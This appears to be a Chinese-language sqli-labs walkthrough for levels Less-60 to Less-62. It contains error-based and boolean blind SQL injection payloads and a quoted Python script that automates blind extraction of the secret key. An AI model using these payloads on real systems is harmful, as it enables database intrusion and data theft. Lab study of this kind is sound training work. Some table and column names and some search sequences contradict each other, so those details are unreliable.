![1791359684921-462d9a44-9dde-4edf-885b-b5c3cf2e30dc.png](./img/285943702/1791359684921-462d9a44-9dde-4edf-885b-b5c3cf2e30dc-077182.png)

**4）爆列名**

```latex
?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='随机表名'),0x7e),1)--+
```

记下 `secret_xxxx`。

![1791359721721-7df71233-9f59-4939-9d48-9cc7940997bf.png](./img/285943702/1791359721721-7df71233-9f59-4939-9d48-9cc7940997bf-114324.png)

**5）取 secret key**

```latex
?id=1") and updatexml(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1),0x7e),1)--+
```

或：

```latex
?id=1") and extractvalue(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1)))--+
```

![1791359773166-b1c3c522-70ef-4925-9ae7-44df66be51b3.png](./img/285943702/1791359773166-b1c3c522-70ef-4925-9ae7-44df66be51b3-935893.png)

![1791359901703-e94975d8-f759-42fd-bc26-493f1e512503.png](./img/285943702/1791359901703-e94975d8-f759-42fd-bc26-493f1e512503-036012.png)

**6）提交密钥**

将错误信息中的密钥填入页面验证框。

![1791359917189-76c076c3-01c8-4468-9fe4-9769a37e6ada.png](./img/285943702/1791359917189-76c076c3-01c8-4468-9fe4-9769a37e6ada-837151.png)

![1791360072497-3da534e0-4deb-4a1b-a814-84ffcde119c2.png](./img/285943702/1791360072497-3da534e0-4deb-4a1b-a814-84ffcde119c2-929069.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `")` |
| 手法 | 报错注入 |
| 目标 | 随机表 secret 列 |
| 次数 | 精简步骤，避免无效探测 |

***

### Less-61：GET · Challenges · 闭合 `'))` · 报错注入（限次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-61/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `'))`（单引号 + 双右括号） |
| 主手法 | **报错注入** |
| 尝试次数 | 约 **5～10 次**（以页面为准） |
| 目标库 | `challenges`，表名/列名随机 |
| 目标 | 限次内取出 secret key 并提交 |
| 与前后关 | 多一层括号，常见于 `WHERE id=(('$id'))` 一类写法 |

#### 源码逻辑（理解用）

类似：

```sql
SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1
```

需 `'))` 才能正确闭合；其余与 58～60 相同：报错取 `challenges` 随机表中的 secret。

#### 解题步骤

**1）确认闭合**

```latex
?id=1'
?id=1')
?id=1'))
?id=1'))--+
```

`1'))--+` 正常 → 闭合为 `'))`。

![1791360320998-0103dd04-8408-463b-952d-77544d09c273.png](./img/285943702/1791360320998-0103dd04-8408-463b-952d-77544d09c273-402184.png)

![1791360336169-db0964c5-88c1-41dc-9f16-4ea3e3d0926f.png](./img/285943702/1791360336169-db0964c5-88c1-41dc-9f16-4ea3e3d0926f-179739.png)

![1791360351025-1bc851ae-de89-4838-a58e-7b55e26da204.png](./img/285943702/1791360351025-1bc851ae-de89-4838-a58e-7b55e26da204-994027.png)

![1791360361701-9958f077-fe08-4c7c-a442-fea231c5f0e8.png](./img/285943702/1791360361701-9958f077-fe08-4c7c-a442-fea231c5f0e8-427731.png)

**2）报错确认**

```latex
?id=1')) and updatexml(1,concat(0x7e,database(),0x7e),1)--+
```

![1791360430442-666f4cc5-92eb-4ae3-94db-adfe51cd8a6b.png](./img/285943702/1791360430442-666f4cc5-92eb-4ae3-94db-adfe51cd8a6b-903906.png)

**3）爆表名**

```latex
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

![1791360483466-1c10ff60-02b3-421d-bcca-085afe7124fb.png](./img/285943702/1791360483466-1c10ff60-02b3-421d-bcca-085afe7124fb-987931.png)

**4）爆列名**

```latex
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='随机表名'),0x7e),1)--+
```

![1791360526878-a819f852-9856-4bce-adcc-f20cae998527.png](./img/285943702/1791360526878-a819f852-9856-4bce-adcc-f20cae998527-279290.png)

**5）取 secret key**

```latex
?id=1')) and updatexml(1,concat(0x7e,(select secret_列名 from 随机表名 limit 0,1),0x7e),1)--+
```

![1791360592383-7f67777a-cd05-41b4-9313-99ed3baaf09c.png](./img/285943702/1791360592383-7f67777a-cd05-41b4-9313-99ed3baaf09c-324206.png)

**6）提交密钥**

填入页面完成挑战。

![1791360610641-aba1ba5a-2188-4cc9-9adb-e9ebf212a3b3.png](./img/285943702/1791360610641-aba1ba5a-2188-4cc9-9adb-e9ebf212a3b3-883487.png)

![1791360620874-103fff99-91bf-444b-8d78-c16df1383ccb.png](./img/285943702/1791360620874-103fff99-91bf-444b-8d78-c16df1383ccb-672161.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 闭合 | `'))`（两层右括号） |
| 手法 | 报错注入 |
| 目标 | `challenges` 随机表 secret |
| 注意 | 只写 `')` 往往不够，必须 `'))` |

***

### Less-62：GET · Challenges · 闭合 `')` · 布尔盲注（约 130 次）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-62/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型 |
| 闭合方式 | `')` |
| 主手法 | **布尔盲注**（无联合回显、无报错回显） |
| 尝试次数 | 约 **130 次** |
| 目标库 | `challenges`，表名/列名/密钥随机 |
| 目标 | 限次内猜出 secret key 并提交 |

#### 源码逻辑（理解用）

类似 `WHERE id=('$id')`。页面只有「有数据 / 无数据」两类表现，没有 `UNION` 列回显，也没有 `updatexml` 错误内容，只能根据真假页逐条件推断。

#### 解题步骤

**1）确认闭合与真假**

```latex
?id=1') and 1=1--+
?id=1') and 1=2--+
```

前者正常、后者异常 → 布尔盲注可用，闭合为 `')`。

![1791361164648-a95268ef-91d0-4172-a264-4d25d78c5266.png](./img/285943702/1791361164648-a95268ef-91d0-4172-a264-4d25d78c5266-414975.png)

![1791361176970-5f0f8477-8ce2-400e-8263-937bb57d620e.png](./img/285943702/1791361176970-5f0f8477-8ce2-400e-8263-937bb57d620e-198678.png)

**2）猜库名长度**

```latex
?id=1') and length(database())>1--+
?id=1') and length(database())>2--+
?id=1') and length(database())>3--+
...
?id=1') and length(database())>9--+
?id=1') and length(database())>10--+

?id=1') and length(database())=10--+
```

有此可得库名的长度为 10。

![1791366116472-7d278288-decd-42e2-a2f5-ad09a2682c47.png](./img/285943702/1791366116472-7d278288-decd-42e2-a2f5-ad09a2682c47-074332.png)

![1791366127812-b55cabef-5099-484f-a7a9-d2088af7c25c.png](./img/285943702/1791366127812-b55cabef-5099-484f-a7a9-d2088af7c25c-765923.png)

**逐字符猜库名（建议二分 ASCII）**

```latex
第一个字符
?id=1') and ascii(substr(database(),1,1))>100--+
?id=1') and ascii(substr(database(),1,1))>50--+
?id=1') and ascii(substr(database(),1,1))>75--+
?id=1') and ascii(substr(database(),1,1))>95--+
?id=1') and ascii(substr(database(),1,1))>98--+
?id=1') and ascii(substr(database(),1,1))>99--+
?id=1') and ascii(substr(database(),1,1))=99--+

第二个字符
?id=1') and ascii(substr(database(),2,1))>100--+
?id=1') and ascii(substr(database(),2,1))>115--+
?id=1') and ascii(substr(database(),2,1))>107--+
?id=1') and ascii(substr(database(),2,1))>105--+
?id=1') and ascii(substr(database(),2,1))>103--+
?id=1') and ascii(substr(database(),2,1))>104--+
?id=1') and ascii(substr(database(),2,1))=104--+

第三个字符
?id=1') and ascii(substr(database(),3,1))>100--+
?id=1') and ascii(substr(database(),3,1))>50--+
?id=1') and ascii(substr(database(),3,1))>75--+
?id=1') and ascii(substr(database(),3,1))>85--+
?id=1') and ascii(substr(database(),3,1))>95--+
?id=1') and ascii(substr(database(),3,1))>98--+
?id=1') and ascii(substr(database(),3,1))>97--+
?id=1') and ascii(substr(database(),3,1))=97--+

第四个字符
?id=1') and ascii(substr(database(),4,1))>100--+
?id=1') and ascii(substr(database(),4,1))>115--+
?id=1') and ascii(substr(database(),4,1))>110--+
?id=1') and ascii(substr(database(),4,1))>105--+
?id=1') and ascii(substr(database(),4,1))>108--+
?id=1') and ascii(substr(database(),4,1))>107--+
?id=1') and ascii(substr(database(),4,1))=108--+

第五个字符
?id=1') and ascii(substr(database(),5,1))>100--+
?id=1') and ascii(substr(database(),5,1))>115--+
?id=1') and ascii(substr(database(),5,1))>110--+
?id=1') and ascii(substr(database(),5,1))>105--+
?id=1') and ascii(substr(database(),5,1))>108--+
?id=1') and ascii(substr(database(),5,1))>107--+
?id=1') and ascii(substr(database(),5,1))=108--+

第六个字符
?id=1') and ascii(substr(database(),6,1))>100--+
?id=1') and ascii(substr(database(),6,1))>115--+
?id=1') and ascii(substr(database(),6,1))>110--+
?id=1') and ascii(substr(database(),6,1))>105--+
?id=1') and ascii(substr(database(),6,1))>103--+
?id=1') and ascii(substr(database(),6,1))>103--+
?id=1') and ascii(substr(database(),6,1))>102--+
?id=1') and ascii(substr(database(),6,1))>101--+

第七个字符
?id=1') and ascii(substr(database(),7,1))>100--+
?id=1') and ascii(substr(database(),7,1))>115--+
?id=1') and ascii(substr(database(),7,1))>110--+
?id=1') and ascii(substr(database(),7,1))>105--+
?id=1') and ascii(substr(database(),7,1))>108--+
?id=1') and ascii(substr(database(),7,1))>109--+
?id=1') and ascii(substr(database(),7,1))=110--+

第八个字符
?id=1') and ascii(substr(database(),8,1))>100--+
?id=1') and ascii(substr(database(),8,1))>115--+
?id=1') and ascii(substr(database(),8,1))>110--+
?id=1') and ascii(substr(database(),8,1))>105--+
?id=1') and ascii(substr(database(),8,1))>103--+
?id=1') and ascii(substr(database(),8,1))>102--+
?id=1') and ascii(substr(database(),8,1))=103--+

第九个字符
?id=1') and ascii(substr(database(),9,1))>100--+
?id=1') and ascii(substr(database(),9,1))>115--+
?id=1') and ascii(substr(database(),9,1))>110--+
?id=1') and ascii(substr(database(),9,1))>105--+
?id=1') and ascii(substr(database(),9,1))>103--+
?id=1') and ascii(substr(database(),9,1))>103--+
?id=1') and ascii(substr(database(),9,1))>102--+
?id=1') and ascii(substr(database(),9,1))>101--+

第十个字符
?id=1') and ascii(substr(database(),10,1))>100--+
?id=1') and ascii(substr(database(),10,1))>115--+
?id=1') and ascii(substr(database(),10,1))>110--+
?id=1') and ascii(substr(database(),10,1))>113--+
?id=1') and ascii(substr(database(),10,1))>114--+
?id=1') and ascii(substr(database(),10,1))=115--+
```

由此可得完整库名是“challenges“。

![1791366449344-c6bc80aa-c824-47d3-b62c-f13afc51381c.png](./img/285943702/1791366449344-c6bc80aa-c824-47d3-b62c-f13afc51381c-802444.png)

![1791366812673-363921ed-093c-40c4-b0f2-74813ffea655.png](./img/285943702/1791366812673-363921ed-093c-40c4-b0f2-74813ffea655-153567.png)

![1791367102845-4d40afaa-d7fb-4c23-b181-da298dc6d086.png](./img/285943702/1791367102845-4d40afaa-d7fb-4c23-b181-da298dc6d086-278956.png)

![1791367624102-4e02fe39-7152-4d54-b712-ea03f3e444c7.png](./img/285943702/1791367624102-4e02fe39-7152-4d54-b712-ea03f3e444c7-207675.png)

![1791367786490-0a9255ee-e1a7-46e0-8a9b-326808a5aff7.png](./img/285943702/1791367786490-0a9255ee-e1a7-46e0-8a9b-326808a5aff7-568310.png)

![1791367986477-1bf6c6ed-618c-489e-b4ca-c04e55b4d8c9.png](./img/285943702/1791367986477-1bf6c6ed-618c-489e-b4ca-c04e55b4d8c9-204868.png)

![1791368168979-11aa10c4-c1c5-4cc1-b989-b5ef63329195.png](./img/285943702/1791368168979-11aa10c4-c1c5-4cc1-b989-b5ef63329195-979007.png)

**3）表名长度（**`challenges`\*\* 下第一张表）\*\*

挑战系列每个库只有 1 张随机表，先用计数确认，再猜长度：

```latex
?id=1') and (select count(table_name) from information_schema.tables where table_schema='challenges')=1--+
```

![1791369128761-652a695f-07c4-44ed-ad97-687de6d5774f.png](./img/285943702/1791369128761-652a695f-07c4-44ed-ad97-687de6d5774f-941809.png)

```latex
?id=1') and length((select table_name from information_schema.tables where table_schema='challenges' limit 0,1))=10--+
```

常见随机表名长度约 10，以本地真假为准。

![1791369353703-0576d0e4-730d-4fd4-af80-2f4e43b21667.png](./img/285943702/1791369353703-0576d0e4-730d-4fd4-af80-2f4e43b21667-934866.png)

**4）逐字符猜表名（建议二分 ASCII）**

```latex
第一个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>110--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>105--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>108--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>107--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))>106--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),1,1))=106--+


第二个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>50--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>65--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>60--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>55--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>58--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>57--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))>56--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),2,1))=57--+

第三个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>110--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>105--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>108--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>107--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))>106--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3,1))=106--+


第四个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>110--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>105--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>108--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))>107--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),4,1))=108--+


第五个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>110--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>105--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>103--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>102--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))>101--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),5,1))=102--+


第六个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))>120--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))>118--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))>117--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),6,1))=118--+


第七个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>50--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>75--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>65--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>55--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>53--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>52--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))>51--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),7,1))=51--+


第八个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>110--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>105--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>108--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))>109--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),8,1))=110--+


第九个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>50--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>75--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>85--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>95--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>98--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))>97--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),9,1))=98--+


第十个字符
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>100--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>115--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>120--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>118--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))>119--+
?id=1') and ascii(substr((select table_name from information_schema.tables where table_schema='challenges' limit 0,1),10,1))=120--+
```

用 `>` / `<` 缩小范围，再对位置 2、3… 重复，拼出完整表名。完整表名为“j9jlfv3nbx“。INBG8ANMPP

![1791372973643-236a3c60-70fd-47ce-bdae-83e5b937b987.png](./img/285943702/1791372973643-236a3c60-70fd-47ce-bdae-83e5b937b987-637656.png)

**5）猜列名数及长度**

```latex
?id=1') and (select count(column_name) from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z')=4--+
```

说明该表有 4 列。

![1791377381890-feecd76c-6b2a-411a-9765-9af263cf651a.png](./img/285943702/1791377381890-feecd76c-6b2a-411a-9765-9af263cf651a-676245.png)

猜第 1 列长度以列名

```latex
?id=1') and length((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1))=2--+

第一位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>100--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>115--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>110--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>105--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>103--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))>104--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),1,1))=105--+

第二位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>100--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>50--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>75--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>85--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>95--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>98--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))>99--+
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 0,1),2,1))=100--+
```

![1791378088348-db06f471-0d67-4ea0-8158-ea41605c0ad0.png](./img/285943702/1791378088348-db06f471-0d67-4ea0-8158-ea41605c0ad0-138621.png)

由此可得第 1 列是 2 位，并且名为“id”。

猜第 2 列长度以列名

```latex
?id=1') and length((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 1,1))=6--+

第一位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 1,1),1,1))>100--+
...

第二位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 1,1),2,1))>100--+
....

第三位字符
...

第四位字符
...

第五位字符
...

第六位字符
...
```

![1791378664591-3d02433f-dad1-498f-b799-3c9c089873f9.png](./img/285943702/1791378664591-3d02433f-dad1-498f-b799-3c9c089873f9-781660.png)

由此可得第 2 列是 6 位，并且名为“sessid”。

猜第 3 列长度以列名

列名常为 `secret_` + 随机后缀。可先确认列数量，再对 `column_name` 做同样盲注：

```latex
?id=1') and length((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 2,1))=11--+

第一位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 2,1),1,1))>100--+
...

第二位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 2,1),2,1))>100--+
....

第三位字符
...

第四位字符
...

...
...

第十一位字符
...
```

（`limit` 偏移按实际列顺序调整；或 `group_concat` 后按字符位猜。）

也可利用规律：前缀固定为 `secret_`，只盲注后面若干字符，节省次数。

![1791456559650-0e20c63e-03f2-4f09-843b-d34887dd61a8.png](./img/285943702/1791456559650-0e20c63e-03f2-4f09-843b-d34887dd61a8-941221.png)

由此可得第 3 列是 11 位，并且名为“secret_QSUB”。

猜第 4 列长度以列名

```latex
?id=1') and length((select column_name from information_schema.columns where table_schema='challenges' and table_name='INBG8ANMPP' limit 3,1))=4--+

第一位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 3,1),1,1))>100--+
...

第二位字符
?id=1') and ascii(substr((select column_name from information_schema.columns where table_schema='challenges' and table_name='2YUHIP6P4Z' limit 3,1),2,1))>100--+
....

第三位字符
...

第四位字符
...
```

![1791456629978-14c68c5d-235b-42f7-b7d0-feae6c112fe7.png](./img/285943702/1791456629978-14c68c5d-235b-42f7-b7d0-feae6c112fe7-261313.png)

由此可得第 4 列是 4 位，并且名为“tryy”。

**6）猜 secret 值**

```latex
?id=1') and length((select secret_列名 from 库名.随机表名 limit 0,1))=24--+
```

![1791457548610-0cee8a1d-fa83-487c-9d66-c506b75d2982.png](./img/285943702/1791457548610-0cee8a1d-fa83-487c-9d66-c506b75d2982-384539.png)

```latex
第一位字符
?id=1') and ascii(substr((select secret_列名 from 库名.随机表名 limit 0,1),1,1))=115--+

第二位字符
?id=1') and ascii(substr((select secret_QSU8 from challenges.j9jlfv3nbx limit 0,1),2,1))=83--+

第三位字符
...
...
...

第二十四位字符
?id=1') and ascii(substr((select secret_QSU8 from challenges.j9jlfv3nbx limit 0,1),24,1))=51--+
```

密钥常见约 24 字符，二分逐位即可。

**6）提交密钥**

拼出完整 key 后填入页面验证。

![1791457938214-434f7895-3c23-4917-a5f2-cb1fc8653d0b.png](./img/285943702/1791457938214-434f7895-3c23-4917-a5f2-cb1fc8653d0b-967642.png)

![1791457955343-d23e4c7d-0328-4c3e-9c42-165136e3f71c.png](./img/285943702/1791457955343-d23e4c7d-0328-4c3e-9c42-165136e3f71c-653661.png)

这里通过手注测试，130 次是不够用的，这关得用脚本过。

引用大佬的脚本：<https://www.jianshu.com/p/f1811e108d58>

python 脚本如下：

```latex
#!/usr/bin/python3
# -*-coding:utf-8-*-

import re
import requests

url = "http://sqli-labs/Less-62/index.php"  # 改成你的地址
try_count = 0

def extract_bits(query, i, bit_values: list):
    """
    获取query执行结果的第 i 个（从1开始算）字符的3个比特
    哪3个比特由bit_values指定
    """
    global try_count

    assert len(bit_values) == 8
    bit_marks = 0
    for v in bit_values:
        bit_marks |= v

    payload = """
    '+(
SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) & ({bit_mark})
    WHEN {0} THEN 1
    WHEN {1} THEN 2
    WHEN {2} THEN 3
    WHEN {3} THEN 4
    WHEN {4} THEN 5
    WHEN {5} THEN 6
    WHEN {6} THEN 7
    ELSE 8
END
)+'
    """.format(*bit_values[:7], query=query, bit_mark=bit_marks, i=i)
    payload = re.sub(r'\s+', ' ', payload.strip().replace("\n", " "))
    # print(payload)

    resp = requests.get(url, params={"id": payload})
    try_count += 1

    infos = ["Angelina", "Dummy", "secure", "stupid", "superman", "batman", "admin", "admin1"]

    match = re.search(r"Your Login name : (.*?)<br>", resp.text)
    assert match
    assert match.group(1) in infos
    bits = bit_values[infos.index(match.group(1))]
    return bits

def extract_data(query, length):
    """
    获取query查询结果的length个字符，每个字符只获取其第7位和前5位
    """
    res = ""
    for i in range(1, length+1):
        b2 = extract_bits(query, i, [0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111])  # 00000111
        b1 = extract_bits(query, i, [0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000])  # 01011000
        if b1 & 0b01000000 == 0:
            # 该字符为数字
            bit = b1 | b2 | 0b00100000
        else:
            # 该字符为字母
            bit = b1 | b2
        res += chr(bit)
    return res


if __name__ == "__main__":
    table_name = extract_data("select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1", 10)
    print("table_name:", table_name)

    secret_key = extract_data("select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name, 24)
    print("secret_key:", secret_key)

    print("Done. try_count:", try_count)

```

运行后如图所示，只需要大约 60 多次就猜解出来了。

```latex
python less62.py
```

![1791458252595-02b22d6f-a81c-46ca-88f5-cf0afd25817f.png](./img/285943702/1791458252595-02b22d6f-a81c-46ca-88f5-cf0afd25817f-244653.png)

![1791458265457-41f16f6d-03da-4f87-97b7-cf730ed4e91c.png](./img/285943702/1791458265457-41f16f6d-03da-4f87-97b7-cf730ed4e91c-990970.png)

![1791458275908-fa5cd776-b21c-4d17-88d2-58c4b9701b8b.png](./img/285943702/1791458275908-fa5cd776-b21c-4d17-88d2-58c4b9701b8b-047684.png)

#### 省次数要点

| 技巧 | 说明 |
| --- | --- |
| 二分法 | 每字符约 7 次，远优于线性 0～127 |
| 已知规律 | 表名长度、`secret_` 前缀、key 长度可先测再爆 |
| 脚本 | 130 次内手注很累，推荐写布尔脚本 |
